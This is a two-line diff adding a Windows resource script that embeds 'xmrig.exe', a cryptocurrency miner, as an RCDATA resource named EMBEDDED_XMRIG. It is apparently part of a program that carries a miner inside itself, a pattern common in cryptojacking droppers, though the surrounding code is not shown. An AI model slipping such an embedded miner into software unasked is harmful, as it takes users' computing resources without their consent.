@@ -1,0 +1,2 @@
+#include "../include/resources.h"
+EMBEDDED_XMRIG RCDATA "xmrig.exe"
